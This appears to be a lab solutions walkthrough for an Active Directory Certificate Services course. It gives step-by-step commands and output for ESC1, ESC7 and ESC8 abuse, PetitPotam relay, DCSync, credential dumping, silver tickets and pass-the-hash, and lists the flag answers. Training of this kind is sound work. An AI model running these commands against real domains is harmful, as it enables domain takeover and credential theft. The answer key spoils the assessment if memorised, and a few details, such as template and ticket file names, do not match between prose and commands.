Subsequently, to abuse `ESC1`, students need to use the `req` command of `certipy`, specifying the template `CropVPN` for the `-template` option and the `UPN` `Administrator` for the `-upn` option; students will attain a `PFX` certificate for the `Administrator` user:

Code: shell

```shell
certipy req -u 'MainOfficePrinter$' -p 087938752c8c78c4886ff8d340a9492b -ca AUTHORITY-CA -template CorpVPN -dc-ip STMIP -upn Administrator
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-gtnfio9rtv]─[~]
└──╼ [★]$ certipy req -u 'MainOfficePrinter$' -p 087938752c8c78c4886ff8d340a9492b -ca AUTHORITY-CA -template CorpVPN -dc-ip 10.129.124.128 -upn Administrator

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 3
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Because the ADCS CA does not support `PKINIT`, students need to avert to `Schannel` and `PassTheCert`; to do so, students first need to use `openssl` to extract the private key from the `PFX` certificate of `Administrator` (when prompted for a `PEM pass phrase`, students must enter one that is at least four characters):

Code: shell

```shell
openssl pkcs12 -in administrator.pfx -nocerts -out administrator.key
```

```
┌─[eu-academy-1]─[10.10.14.187]─[htb-ac-413848@htb-ytnix82utx]─[~]
└──╼ [★]$ openssl pkcs12 -in administrator.pfx -nocerts -out administrator.key

Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
```

Afterward, students need to use `openssl` to extract the public key from the `PFX` certificate of `Administrator`:

Code: shell

```shell
openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out administrator.crt
```

```
┌─[eu-academy-1]─[10.10.14.187]─[htb-ac-413848@htb-ytnix82utx]─[~]
└──╼ [★]$ openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out administrator.crt

Enter Import Password:
```

Additionally, students need to remove the `PEM pass phrase` from the private key:

Code: shell

```shell
openssl rsa -in administrator.key -out administrator-nopass.key
```

```
┌─[eu-academy-1]─[10.10.14.187]─[htb-ac-413848@htb-3mnanp8ej8]─[~]
└──╼ [★]$ openssl rsa -in administrator.key -out administrator-nopass.key

Enter pass phrase for administrator.key:
writing RSA key
```

Students then need to clone [PassTheCert](https://github.com/AlmondOffSec/PassTheCert) and change the location of `PassTheCert/Python/passthecert.py` to be where `administrator.crt` and `administrator-nopass.key` are:

Code: shell

```shell
git clone -q https://github.com/AlmondOffSec/PassTheCert
mv PassTheCert/Python/passthecert.py .
```

```
┌─[eu-academy-1]─[10.10.14.187]─[htb-ac-413848@htb-3mnanp8ej8]─[~]
└──╼ [★]$ git clone -q https://github.com/AlmondOffSec/PassTheCert
mv PassTheCert/Python/passthecert.py .
```

Subsequently, students need to use `passthecert.py` to grant `DCSync` rights to `blwasp`:

Code: shell

```shell
python3 passthecert.py -dc-ip STMIP -crt administrator.crt -key administrator-nopass.key -domain authority.htb -port 636 -action modify_user -target blwasp -elevate
```

```
┌─[eu-academy-1]─[10.10.14.187]─[htb-ac-413848@htb-3mnanp8ej8]─[~]
└──╼ [★]$ python3 passthecert.py -dc-ip 10.129.229.56 -crt administrator.crt -key administrator-nopass.key -domain authority.htb -port 636 -action modify_user -target blwasp -elevate

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Granted user 'blwasp' DCSYNC rights!
```

Utilizing the credentials `blwasp:Password123!`, students then need to use `secretsdump.py` to dump the SAM on the DC; students will attain the NT hash `c5f2d015f316018f6405522825689ffe` of `Administrator`:

Code: shell

```shell
secretsdump.py authority.htb/blwasp:'Password123!'@STMIP -just-dc-user Administrator
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-gtnfio9rtv]─[~]
└──╼ [★]$ secretsdump.py authority.htb/blwasp:'Password123!'@10.129.124.128 -just-dc-user Administrator

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c5f2d015f316018f6405522825689ffe:::
<SNIP>
```

At last, students need to `pass-the-hash` with `wmiexec.py` and read the contents of the file `C:\Users\Administrator\Desktop\flag.txt` to attain the flag `HTB{ADC$_PK!N!T_N0SUPP}`:

Code: shell

```shell
wmiexec.py -no-pass -hashes :c5f2d015f316018f6405522825689ffe administrator@STMIP "more C:\Users\Administrator\Desktop\flag.txt"
```

```
┌─[eu-academy-1]─[10.10.14.187]─[htb-ac-413848@htb-3mnanp8ej8]─[~]
└──╼ [★]$ wmiexec.py -no-pass -hashes :c5f2d015f316018f6405522825689ffe administrator@10.129.229.56 "more C:\Users\Administrator\Desktop\flag.txt"

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] SMBv3.0 dialect used
HTB{ADC$_PK!N!T_N0SUPP}
```

Answer: `HTB{ADC$_PK!N!T_N0SUPP}`

# Skills Assessment

## Question 1

### "Use the credentials of tom@lab.local (tom:tom123) to compromise DEV01. Submit the content of the flag C:\\Users\\Administrator\\Desktop\\flag.txt."

After spawning the target machine, students need to connect to it with SSH, passing the password `HTB_@cademy_stdnt!` with `sshpass` (it is important to set the `-oStrictHostKeyChecking` option to `accept-new`, which allows SSH to automatically add new host keys to the user's known hosts files):

Code: shell

```shell
sshpass -p 'HTB_@cademy_stdnt!' ssh htb-student@STMIP -oStrictHostKeyChecking=accept-new
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-jyuiquw0eq]─[~]
└──╼ [★]$ sshpass -p 'HTB_@cademy_stdnt!' ssh htb-student@10.129.205.205 -oStrictHostKeyChecking=accept-new

Warning: Permanently added '10.129.205.205' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-155-generic x86_64)
<SNIP>
$ 
```

Students then need to spawn a `bash` shell as root (instead of the default `sh` one):

Code: shell

```shell
sudo bash
```

```
$ sudo bash

[sudo] password for htb-student: 
root@ubuntu:/home/htb-student#
```

When using the `ip` command, students will find that the attack box's internal IP address is `172.16.19.19`:

Code: shell

```shell
ip a show ens192 | grep "inet" -m 1
```

```
root@ubuntu:/home/htb-student# ip a show ens192 | grep "inet" -m 1

    inet 172.16.19.19/24 brd 172.16.19.255 scope global ens192
```

Instead of performing an `nmap` scan with port scanning on the entire `172.16.19.0/24` subnet, students can first identify alive hosts using the `-sn` option, which does discovery by sending ICMP echo requests; students will find three hosts, `172.16.19.3`, `172.16.19.5`, and `172.16.19.77`:

Code: shell

```shell
nmap -sn 172.16.19.0/24 --exclude 172.16.19.19
```

```
root@ubuntu:/home/htb-student# nmap -sn 172.16.19.0/24 --exclude 172.16.19.19

Starting Nmap 7.80 ( https://nmap.org ) at 2023-12-20 23:29 UTC
Nmap scan report for lab.local (172.16.19.3)
Host is up (0.00051s latency).
MAC Address: 00:50:56:B9:7B:1B (VMware)
Nmap scan report for ws01.lab.local (172.16.19.5)
Host is up (0.00047s latency).
MAC Address: 00:50:56:B9:9D:BC (VMware)
Nmap scan report for dev01.lab.local (172.16.19.77)
Host is up (0.00029s latency).
MAC Address: 00:50:56:B9:71:F6 (VMware)
Nmap done: 255 IP addresses (3 hosts up) scanned in 1.69 seconds
```

Subsequently, using `nmap` with the `-A` option, students need to enumerate the services running on the hosts:

Code: shell

```shell
nmap -A 172.16.19.3-5 172.16.19.77
```

```
root@ubuntu:/home/htb-student# nmap -A 172.16.19.3-5 172.16.19.77

Starting Nmap 7.80 ( https://nmap.org ) at 2023-12-20 23:35 UTC
Nmap scan report for lab.local (172.16.19.3)
Host is up (0.00065s latency).
Not shown: 988 closed ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-20 23:36:03Z)
135/tcp  open  msrpc         Microsoft Windows RPC
<SNIP>

Nmap scan report for ws01.lab.local (172.16.19.5)
Host is up (0.00058s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|   NTLM
|_  Negotiate
<SNIP>

TRACEROUTE
HOP RTT     ADDRESS
1   0.58 ms ws01.lab.local (172.16.19.5)

Nmap scan report for dev01.lab.local (172.16.19.77)
Host is up (0.00057s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
<SNIP>

Post-scan script results:
| clock-skew: 
|   0s: 
|     172.16.19.5 (ws01.lab.local)
|     172.16.19.77 (dev01.lab.local)
|_    172.16.19.3 (lab.local)
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 4 IP addresses (3 hosts up) scanned in 170.73 seconds
```

`/etc/hosts` already contains vHost entries for the hosts within the target's internal network:

Code: shell

```shell
cat /etc/hosts
```

```
root@ubuntu:/home/htb-student# cat /etc/hosts

<SNIP>

172.16.19.77 dev01.lab.local
172.16.19.3 lab.local	lab-dc.lab.local
172.16.19.5 ws01.lab.local
<SNIP>
```

When using `certipy` with the `find` command and the `-vulnerable` option to enumerate the ADCS CA (`ws01.lab.local`) for vulnerabilities utilizing the credentials `tom:tom123`, students will discover that the CA suffers from `ESC8` and `ESC11`:

Code: shell

```shell
certipy find -u tom -p tom123 -dc-ip 172.16.19.3 -vulnerable -stdout
```

```
root@ubuntu:/home/htb-student# certipy find -u tom -p tom123 -dc-ip 172.16.19.3 -vulnerable -stdout

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'lab-WS01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'lab-WS01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'lab-WS01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'lab-WS01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : lab-WS01-CA
    DNS Name                            : WS01.lab.local
    Certificate Subject                 : CN=lab-WS01-CA, DC=lab, DC=local
    Certificate Serial Number           : 238F549429FFF796430B5F486159490B
    Certificate Validity Start          : 2023-07-06 09:44:47+00:00
    Certificate Validity End            : 2122-07-06 09:54:47+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
    Permissions
      Owner                             : LAB.LOCAL\Administrators
      Access Rights
        Enroll                          : LAB.LOCAL\Authenticated Users
                                          LAB.LOCAL\src_management
        ManageCertificates              : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrators
                                          LAB.LOCAL\src_management
        ManageCa                        : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrators
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
Certificate Templates                   : [!] Could not find any certificate templates
```

Before abusing `ESC8` or `ESC11`, students need to start a new `tmux` session to allow multiple panes usage (students can split panes vertically using the key combination `Ctrl` + `b` + `%` (or `"` for a horizontal split)):

Code: shell

```shell
tmux new -s SA
```

```
root@ubuntu:/home/htb-student# tmux new -s SA
```

Students can either abuse `ESC8` or `ESC11` to coerce `NTLM` authentication from `dev01.lab.local`. Due to security mechanisms put forth, students will not be able to coerce authentication from the domain controller `lab.local`.

To abuse `ESC8`, students first need to, in one pane, use the `relay` command of `certipy`, specifying the hostname (or IP address) of the ADCS CA server for the `-target` option:

Code: shell

```shell
certipy relay -target http://ws01.lab.local
```

```
root@ubuntu:/home/htb-student# certipy relay -target http://ws01.lab.local

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting http://ws01.lab.local/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
```

In another pane, students need to, utilizing the credentials `tom:tom123`, use `PetitPotam.py` (or [coercer](https://github.com/p0dalirius/Coercer)) to coerce `172.16.19.77`/`dev01.lab.local` into performing `SMB` `NTLM` authentication against `172.16.19.19` and have `coercer` relay it over `HTTP` to `ws01.lab.local`/`172.16.19.5` (which is one type of `NTLM` `cross-protocol relay attacks`):

Code: shell

```shell
 python3 PetitPotam.py -u tom -p tom123 -d lab.local 172.16.19.19 172.16.19.77
```

```
root@ubuntu:/home/htb-student# python3 PetitPotam.py -u tom -p tom123 -d lab.local 172.16.19.19 172.16.19.77

              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _\` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "\`-0-0-'"\`-0-0-'"\`-0-0-'"\`-0-0-'"\`-0-0-'"\`-0-0-'"\`-0-0-'"\`-0-0-'"\`-0-0-'"\`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

Trying pipe lsarpc
[-] Connecting to ncacn_np:172.16.19.77[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

When checking the tab with `certipy`, students will notice that a `PFX` certificate for the machine account `DEV01$` has been attained:

```
DC\DEV01$
[*] Requesting certificate for 'DC\\DEV01$' based on the template 'Machine'
[*] Got certificate with DNS Host Name 'DEV01.lab.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'dev01.pfx'
[*] Exiting...
```

Utilizing the certificate, students need to use the `auth` command of `certipy` to request a TGT for `DEV01$` and `Un-PAC-the-hash` within it:

Code: shell

```shell
certipy auth -pfx dev01.pfx
```

```
root@ubuntu:/home/htb-student# certipy auth -pfx dev01.pfx 

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: dev01$@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'dev01.ccache'
[*] Trying to retrieve NT hash for 'dev01$'
[*] Got hash for 'dev01$@lab.local': aad3b435b51404eeaad3b435b51404ee:42b64e262b1c6685c557c81d24ee385e
```

With the NT hash of `dev01$` attained, students then need to query the DC/`lab.local` with `lookupsid.py` to get the SID of the domain, finding it to be `S-1-5-21-1817219280-1014233819-995920665`:

Code: shell

```shell
lookupsid.py 'lab.local/dev01$'@lab.local -hashes :42b64e262b1c6685c557c81d24ee385e
```

```
root@ubuntu:/home/htb-student# lookupsid.py 'lab.local/dev01$'@lab.local -hashes :42b64e262b1c6685c557c81d24ee385e

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Brute forcing SIDs at lab.local
[*] StringBinding ncacn_np:lab.local[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1817219280-1014233819-995920665
<SNIP>
```

Subsequently, students need to utilize `ticketer.py` to forge a silver ticket as `Administrator` on `dev01.lab.local`, specifying the NT hash of `dev01$` for the `-nthash` option, the domain SID for the `-domain-sid` option, `lab.local` for the `-domain` option, and `cifs/dev01.lab.local` for the `spn` option:

Code: shell

```shell
ticketer.py -nthash 42b64e262b1c6685c557c81d24ee385e -domain-sid S-1-5-21-1817219280-1014233819-995920665 -domain lab.local -spn cifs/dev01.lab.local Administrator
```

```
root@ubuntu:/home/htb-student# ticketer.py -nthash 42b64e262b1c6685c557c81d24ee385e -domain-sid S-1-5-21-1817219280-1014233819-995920665 -domain lab.local -spn cifs/dev01.lab.local Administrator

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for lab.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

At last, students need to `pass-the-ticket` with `wmiexec.py` and read the contents of the file `C:\Users\Administrator\Desktop\flag.txt` to attain the flag `HTB{C3r7IFic47e_F7W}`:

Code: shell

```shell
KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass dev01.lab.local "more C:\Users\Administrator\Desktop\flag.txt"
```

```
root@ubuntu:/home/htb-student# KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass dev01.lab.local "more C:\Users\Administrator\Desktop\flag.txt"

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
HTB{C3r7IFic47e_F7W}
```

Answer: `HTB{C3r7IFic47e_F7W}`

# Skills Assessment

## Question 2

### "What is the password for jimmy's account?"

Utilizing the previously attained silver ticket, students need to `pass-the-ticket` with `secretsdump.py` to dump the SAM on `dev01.lab.local`; students will find that the password for `jimmy`'s account is `jimmy_001`:

Code: shell

```shell
KRB5CCNAME=dev01.ccache secretsdump.py -k -no-pass dev01.lab.local
```

```
root@ubuntu:/home/htb-student# KRB5CCNAME=dev01.ccache secretsdump.py -k -no-pass dev01.lab.local

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf8fac0c45a88516e4ae0bf03171c5ac3
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
<SNIP>
[*] DefaultPassword 
DC\jimmy:jimmy_001
<SNIP>
```

Answer: `jimmy_001`

# Skills Assessment

## Question 3

### "Compromise DC01 and submit the value of the flag file at C:\\Users\\Administrator\\Desktop\\flag.txt"

Utilizing the previously harvested credentials `jimmy:jimmy_001`, students need to use `certipy` with the `find` command and the `-vulnerable` option to enumerate the ADCS CA for vulnerabilities; students will discover that the group `src_management` has dangerous permissions over the CA (`ManageCertificates`), rendering it vulnerable to `ESC7`:

Code: shell

```shell
certipy find -u jimmy -p jimmy_001 -dc-ip 172.16.19.3 -vulnerable -stdout
```

```
root@ubuntu:/home/htb-student# certipy find -u jimmy -p jimmy_001 -dc-ip 172.16.19.3 -vulnerable -stdout

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'lab-WS01-CA' via CSRA
[*] Got CA configuration for 'lab-WS01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : lab-WS01-CA
    DNS Name                            : WS01.lab.local
    Certificate Subject                 : CN=lab-WS01-CA, DC=lab, DC=local
    Certificate Serial Number           : 238F549429FFF796430B5F486159490B
    Certificate Validity Start          : 2023-07-06 09:44:47+00:00
    Certificate Validity End            : 2122-07-06 09:54:47+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
    Permissions
      Owner                             : LAB.LOCAL\Administrators
      Access Rights
        Enroll                          : LAB.LOCAL\Authenticated Users
                                          LAB.LOCAL\src_management
        ManageCertificates              : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrators
                                          LAB.LOCAL\src_management
        ManageCa                        : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrators
    [!] Vulnerabilities
      ESC7                              : 'LAB.LOCAL\\src_management' has dangerous permissions
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
Certificate Templates                   : [!] Could not find any certificate templates
```

Because `jimmy` belongs to the `src_management` group, `certipy` reported that the CA suffers from `ESC7`; students can utilize `BloodHound` and `certipy` to find out that `src_management`, which `jimmy` belongs to, has `ManageCertificates` over the CA:

![[HTB Solutions/CAPE/z. images/f6ea75e425c46e530aa4932f8e9c05f5_MD5.jpg]]

However, despite `certipy` reporting that there are no vulnerable certificate templates, when using the `-enabled` option, students will discover that `VPN_Users`, which allows the user `tom` to enroll in it, has the value `EnrolleeSuppliesSubject` for the field `Certificate Name Flag` and allows `Client Authentication`, rendering it vulnerable to `ESC1`:

Code: shell

```shell
certipy find -u jimmy -p jimmy_001 -dc-ip 172.16.19.3 -enabled -stdout
```

```
<SNIP>
Certificate Templates
  0
    Template Name                       : VPN_Users
    Display Name                        : VPN_Users
    Certificate Authorities             : lab-WS01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          PendAllRequests
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : True
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LAB.LOCAL\Domain Computers
                                          LAB.LOCAL\tom
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users
                                          LAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : LAB.LOCAL\Administrator
        Write Owner Principals          : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
        Write Dacl Principals           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
        Write Property Principals       : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
```

Despite `VPN_Users` requiring `Manager Approval`, this can be circumvented with `jimmy`'s `ManageCertificates` right.

Utilizing the credentials `tom:tom123`, students need to use the `req` command of `certipy`, specifying the template `VPN_Users` for the `-template` option and the `UPN` `Josy` for the `-upn` option (when prompted to save the private key, students can either answer with yes or no, however, remembering the `Request ID` is important):

Code: shell

```shell
certipy req -u tom@lab.local -p tom123 -ca lab-WS01-CA -target-ip 172.16.19.5 -template VPN_Users -upn Administrator
```

```
root@ubuntu:/home/htb-student# certipy req -u tom@lab.local -p tom123 -ca lab-WS01-CA -target-ip 172.16.19.5 -template VPN_Users -upn Administrator

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[!] Certificate request is pending approval
[*] Request ID is 24
Would you like to save the private key? (y/N) y
[*] Saved private key to 24.key
[-] Failed to request certificate
```

Using the credentials `jimmy:jimmy_001`, students need to use `ca` command of `certipy`, specifying the `Request ID` previously attained for the `-issue-request` option (because ADCS does not live on the DC/`lab.local`, it is important to utilize the `-target-ip` option along with the IP address of the ADCS CA server `172.16.19.5`):

Code: shell

```shell
certipy ca -u jimmy@lab.local -p jimmy_001 -ca lab-WS01-CA -target-ip 172.16.19.5 -issue-request 24
```

```
root@ubuntu:/home/htb-student# certipy ca -u jimmy@lab.local -p jimmy_001 -ca lab-WS01-CA -target-ip 172.16.19.5 -issue-request 24

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

Subsequently, students need to utilize the credentials `tom:tom123` with the `req` command of `certipy`, specifying the `Request ID` previously attained for the `-retrieve` option to attain a `PFX` certificate for the `Administrator` user (the user `jimmy` will not be able to retrieve it):

Code: shell

```shell
certipy req -u tom@lab.local -p tom123 -ca lab-WS01-CA -target-ip 172.16.19.5 -retrieve 24
```

```
root@ubuntu:/home/htb-student# certipy req -u tom@lab.local -p tom123 -ca lab-WS01-CA -target-ip 172.16.19.5 -retrieve 24

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 24
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Loaded private key from '24.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

Utilizing the certificate, students need to use the `auth` command of `certipy` to request a TGT for `Administrator` and `Un-PAC-the-hash` within it:

```shell
certipy auth -pfx administrator.pfx -domain lab.local
```
```
root@ubuntu:/home/htb-student# certipy auth -pfx administrator.pfx -domain lab.local

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@lab.local': aad3b435b51404eeaad3b435b51404ee:61208396569628a7a987d1dadb7683bb
```

At last, students need to `pass-the-ticket` with `wmiexec.py` and read the contents of the file `C:\Users\Administrator\Desktop\flag.txt` to attain the flag `HTB{C0mprOm1s3d_D0ma1n}`:

```shell
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass lab-dc.lab.local "more C:\Users\Administrator\Desktop\flag.txt"
```
```
root@ubuntu:/home/htb-student# KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass lab-dc.lab.local "more C:\Users\Administrator\Desktop\flag.txt"

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
HTB{C0mprOm1s3d_D0ma1n}
```

Answer: `HTB{C0mprOm1s3d_D0ma1n}`